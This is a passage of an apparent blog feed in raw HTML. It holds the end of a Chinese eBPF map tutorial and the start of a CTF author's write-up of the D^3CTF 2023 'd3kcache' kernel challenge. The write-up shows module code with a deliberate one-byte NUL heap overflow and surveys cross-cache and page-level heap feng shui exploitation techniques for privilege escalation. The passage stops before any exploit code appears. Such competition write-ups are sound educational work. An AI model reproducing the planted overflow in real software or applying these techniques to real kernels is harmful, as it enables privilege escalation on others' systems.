id="三、raw-eBPF-map-使用"><a href="#三、raw-eBPF-map-使用" class="headerlink" title="三、raw eBPF map 使用"></a>三、raw eBPF map 使用</h2><p>eBPF map 为以 <code>key→value</code> 映射格式存储数据的通用的数据存储结构，用于在不同程序之间共享数据，本节主要介绍 eBPF map 的基本用法</p><h3 id="创建-eBPF-map"><a href="#创建-eBPF-map" class="headerlink" title="创建 eBPF map"></a>创建 eBPF map</h3><p>我们可以通过 <code>BPF_MAP_CREATE</code> 命令创建一个新的 eBPF map，其会返回一个文件描述符作为该 map 的引用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size, </span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_type = map_type,<br>        .key_size = key_size,<br>        .value_size = value_size,<br>        .max_entries = max_entries,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="更新-eBPF-map"><a href="#更新-eBPF-map" class="headerlink" title="更新 eBPF map"></a>更新 eBPF map</h3><p>我们可以通过 <code>BPF_MAP_UPDATE</code> 命令更新 map 中对应的 <code>key→value</code> 映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *key,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *value,<span class="hljs-type">uint64_t</span> flags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>        .flags = flags,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><p>flags 应当为如下之一：</p><table><thead><tr><th align="center">flags</th><th align="center">描述</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">BPF_ANY</td><td align="center">有则更新，无则新建</td><td align="center"></td></tr><tr><td align="center">BPF_NOEXIST</td><td align="center">仅在不存在时进行创建</td><td align="center">若已有对应的 key 则返回 <code>-EEXIST</code></td></tr><tr><td align="center">BPF_EXIST</td><td align="center">仅在存在时进行更新</td><td align="center">若无对应的 key 则返回 <code>-ENOENT</code></td></tr></tbody></table><p>在创建新映射时若 map 中映射数量已经达到 <code>max_entries</code> 则会返回 <code>E2BIG</code></p><h3 id="在-eBPF-map-中查找"><a href="#在-eBPF-map-中查找" class="headerlink" title="在 eBPF map 中查找"></a>在 eBPF map 中查找</h3><p>我们可以通过 <code>BPF_MAP_LOOKUP_ELEM</code> 命令查找 map 中是否存在对应的 key，若是则内核会将 value 拷贝到用户空间指定的 value 缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="遍历-eBPF-map"><a href="#遍历-eBPF-map" class="headerlink" title="遍历 eBPF map"></a>遍历 eBPF map</h3><p><code>BPF_MAP_GET_NEXT_KEY</code> 是一个非常有意思的命令，其会在 map 中查找我们所传入的 key，并将该 key 的下一个 key 拷贝回用户空间，若不存在该 key 则会返回 0 并拷贝 map 中第一个 key 到用户空间，若该 key 为最后一个 key 则返回 <code>-1</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_get_next_key</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .next_key = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用这个命令我们可以很方便地遍历一个 eBPF map：先传入一个不存在的 key 获取到 map 中的第一个 key，接下来再不断 <code>BPF_MAP_GET_NEXT_KEY</code> 直到返回 <code>-1</code> 即可</p><h3 id="删除-eBPF-map-数据"><a href="#删除-eBPF-map-数据" class="headerlink" title="删除 eBPF map 数据"></a>删除 eBPF map 数据</h3><p>我们可以通过 <code>BPF_MAP_DELETE_ELEM</code> 命令删除 map 中已有的映射，若不存在则会返回 <code>-EPERM</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="销毁-eBPF-map"><a href="#销毁-eBPF-map" class="headerlink" title="销毁 eBPF map"></a>销毁 eBPF map</h3><p>在内核的 eBPF map 数据结构中会保存引用了该 map 的程序数量，若该 map 不再被任一程序引用则会自动释放，因此我们并不需要主动去销毁一个 eBPF map：）</p><h3 id="一个🌰程序"><a href="#一个🌰程序" class="headerlink" title="一个🌰程序"></a><em>一个🌰程序</em></h3><p>下面是使用 eBPF map 的一个示🌰程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_packet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_ether.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size, </span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_type = map_type,<br>        .key_size = key_size,<br>        .value_size = value_size,<br>        .max_entries = max_entries,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *key,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *value,<span class="hljs-type">uint64_t</span> flags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>        .flags = flags,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">char</span> orig_value[<span class="hljs-number">0x100</span>] = <span class="hljs-string">&quot;1145141919810&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> map_fd;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Creating new eBPF map...&quot;</span>);<br>    map_fd = bpf_map_create(BPF_MAP_TYPE_HASH, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Adding new map of key-&gt;value...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, <span class="hljs-string">&quot;arttnba3&quot;</span>, orig_value, BPF_ANY) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to update eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Looking up element in map...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, <span class="hljs-string">&quot;arttnba3&quot;</span>, value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up elem in eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get the elem of key %s: %s\n&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, value);<br><br>    close(map_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行效果如下：</p><p><img src="https://s2.loli.net/2023/05/31/C3vdouj5VryPMws.png" alt="image.png"></p><p>运行在内核中的 eBPF 程序也可以通过 eBPF map 的 fd 访问一个 eBPF map，下面是一个示🌰程序：</p><blockquote><p>注：这里笔者将常用函数 &amp; 指令封装在了 <a href="/download/bpf_tools.h">bpf_tools.h</a> 中</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF.REFERENCE"></a>0xFF.REFERENCE</h1><p><a href="https://arthurchiao.art/blog/linux-socket-filtering-aka-bpf-zh/">[译] Linux Socket Filtering (LSF, aka BPF)（KernelDoc，2021）</a></p><p><a href="https://heapdump.cn/article/5420563">HeapDump - eBPF指令集规范v1.0</a></p><p><a href="https://www.anquanke.com/post/id/263803">BPF之路一bpf系统调用</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;BEE BEE I’M A SHEEP&lt;/p&gt;</summary>
    
    
    
    <category term="EBPF" scheme="https://arttnba3.github.io/categories/EBPF/"/>
    
    
    <category term="eBPF" scheme="https://arttnba3.github.io/tags/eBPF/"/>
    
    <category term="Linux kernel" scheme="https://arttnba3.github.io/tags/Linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x08】D^ 3CTF2023 d3kcache 出题手记</title>
    <link href="https://arttnba3.github.io/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/"/>
    <id>https://arttnba3.github.io/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/</id>
    <published>2023-05-01T17:13:27.000Z</published>
    <updated>2023-12-18T07:02:36.535Z</updated>
    
    <content type="html"><![CDATA[<p>「さらば、全てのリヌクス カーネル エクスプロイテーション。」</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>都是废话，可以不用看（笑）</p></blockquote><p>不出意外的话这应该是笔者本科阶段最后一次出 D3CTF 的题目了，虽然说笔者一直想整一些好活，但是鉴于笔者实在是太菜了所以一直没能出过特别优秀的题目：）</p><!--相信有不少人（当然，笔者的烂题应该不会有多少人愿意做:-D ）应当已经注意到题目的 banner 是 neta 自新世纪福音战士剧场版的海报----笔者需要为自己过去失败的这一年多时间画上一个不完美的句号，而这道题便是笔者向曾经那个被困于 Linux kernel 的小朋友所作的最终道别：）--><p>笔者一直在想，作为一名黑客，在剥离去各种不同的题目结构、漏洞环境的背后，<strong>我们究竟能在多么极端的情况下完成对一个漏洞的利用？我们是否能够脱离实验室的理想环境实现一种足以应用在实战中的通解？</strong></p><p>Google 在 CVE-2021-22555 当中向我们展示了一个普通的堆上 2 字节溢出如何变成堆溢出&amp; UAF 通杀解法，<a href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">BitsByWill</a> 在 corCTF 2022 中向我们展示了利用页级内核堆风水打破不同 caches 间的阻隔，<a href="https://syst3mfailure.io/">D3v17</a> 则仅利用一个 <code>&#39;\0&#39;</code> 字节的堆溢出便完成了内核提权，<a href="https://kylebot.net/">Kylebot</a> 更是将这一个 <code>&#39;\0&#39;</code> 字节的堆溢出转成了 cross-cache overflow 完成利用，那么再更进一步呢——</p><ul><li>如果漏洞所在结构体大小不够合适&#x2F;结构体自身无法帮助我们完成利用，我们只能借助 <code>msg_msg</code> 等结构体去适配大小，但这类结构体较为稀有且存在诸多限制（例如往往带有一个 header）</li><li>如果漏洞存在于一个独立的 <code>kmem_cache</code> 当中，我们无法借助其他的内核结构体完成利用，只能考虑转化为 cross-cache overflow</li><li>如果漏洞仅有 1 字节的溢出，我们无法利用页级堆风水转成利用 Google 的通杀 exp ，又或是禁用了 System V 消息队列无法利用多级 <code>msg_msg</code>  构造 UAF，我们便只能考虑其他的方案</li><li>如果系统内存较小， 或是 <code>modprobe_path</code> 为静态值，Kylebot 的 unlink attack 将无法发挥作用，我们只好考虑 D3v17 的 <code>poll_list</code> 任意释放</li><li>如果漏洞所在结构体大小不够合适，我们只能进行更加细粒度的页级堆风水，<strong>而不同 order 间的风水会使得成功率大打折扣</strong></li><li><strong>如果内核开启了 Control Flow Integrity，又或者我们甚至都不知道内核镜像信息，那么传统的 ROP 方法基本宣告死亡</strong></li></ul><p><strong>在这样极端的情况下，我们是否还仍能够找到一种通法来完成对内核漏洞的利用？</strong>——这便是笔者在出这道题时最初的想法：）</p><!--此外，笔者认为，**若我们真的找到了这样的一种通法，那么此后的基于内存破坏的 Linux kernel exploitation 便真正算是宣告走到了尽头，此后所有的此类漏洞或是题目不过都是换一种形式过家家罢了：）**----这也是为什么笔者要用 《eva：终》 的那句话来作为这道题目的标语。--><h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01.题目分析"></a>0x01.题目分析</h1><p>题目逆向起来应该还是比较简单的，在模块初始化函数中创建了一个独立的 <code>kmem_cache</code> ，对象大小为 2048：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_SIZE 2048</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">d3kcache_module_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    kcache_jar = kmem_cache_create_usercopy(<span class="hljs-string">&quot;kcache_jar&quot;</span>, KCACHE_SIZE, <span class="hljs-number">0</span>, <br>                         SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, <br>                         <span class="hljs-number">0</span>, KCACHE_SIZE, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">memset</span>(kcache_list, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(kcache_list));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>自定义的 ioctl 函数提供了分配、追加编辑、释放、读取的一个堆菜单，漏洞便出在追加编辑当中，当写满 2048 字节时存在着一个 <code>\0</code> 字节的溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">d3kcache_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *__file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> param)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">switch</span> (cmd) &#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">case</span> KCACHE_APPEND:<br>            <span class="hljs-keyword">if</span> (usr_cmd.idx &lt; <span class="hljs-number">0</span> || usr_cmd.idx &gt;= KCACHE_NUM <br>                || !kcache_list[usr_cmd.idx].buf) &#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kcache:] Invalid index to write.&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (usr_cmd.sz &gt; KCACHE_SIZE || <br>                (usr_cmd.sz + kcache_list[usr_cmd.idx].size) &gt;= KCACHE_SIZE) &#123;<br>                size = KCACHE_SIZE - kcache_list[usr_cmd.idx].size;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                size = usr_cmd.sz;<br>            &#125;<br><br>            kcache_buf = kcache_list[usr_cmd.idx].buf;<br>            kcache_buf += kcache_list[usr_cmd.idx].size;<br><br>            <span class="hljs-keyword">if</span> (copy_from_user(kcache_buf, usr_cmd.buf, size)) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            kcache_buf[size] = <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">/* 漏洞点 */</span><br><br>            retval = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>同时查看题目所提供的内核编译文件，可以发现<strong>开启了 Control Flow Integrity 保护</strong>：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_CFI_CLANG</span>=y<br></code></pre></td></tr></table></figure><p>其他的各种常规保护（KPTI、KASLR、Hardened Usercopy、…）基本上都是开启的，这里就不阐述了</p><blockquote><p>当然，做内核漏洞利用自然要默认这些保护都开了：）</p></blockquote><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>由于题目所在的 <code>kmem_cache</code> 为一个独立的  <code>kmem_cache</code> ，因此我们只能考虑 <strong>cross-cache overflow</strong>：<strong>溢出到其他结构体所在页面上完成利用</strong></p><blockquote><p>毕竟你总不能指望在 freelist 相关保护都开启的情况下 free object 的 next 指针刚好在前 8 字节然后覆写又刚好能把 freelist 劫持到有效可控地址上：）</p></blockquote><h2 id="Step-I-页级堆风水构造稳定跨页溢出布局"><a href="#Step-I-页级堆风水构造稳定跨页溢出布局" class="headerlink" title="Step.I - 页级堆风水构造稳定跨页溢出布局"></a>Step.I - 页级堆风水构造稳定跨页溢出布局</h2><p>为了保证溢出的稳定性，这里笔者使用页级堆风水的方法来构造<strong>预溢出布局</strong></p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>页级堆风水是一种其实不算新但是其实还是稍微有点新的利用手法，顾名思义，<strong>页级堆风水</strong>即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们<strong>手工构造一个新的已知的页级粒度内存页排布</strong></p><p>首先让我们重新审视 slub allocator 向 buddy system 请求页面的过程，当 freelist page 已经耗空且 partial 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 buddy system 申请页面：</p><p><img 